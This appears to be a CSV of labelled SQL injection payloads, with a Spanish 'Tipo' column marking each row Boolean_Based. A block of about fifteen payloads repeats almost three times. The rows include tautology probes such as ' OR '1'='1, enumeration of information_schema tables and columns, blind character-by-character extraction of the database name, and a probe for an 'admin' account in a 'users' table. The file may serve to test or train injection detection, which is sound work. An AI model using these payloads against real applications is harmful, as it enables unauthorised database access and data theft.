Payload,Tipo
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
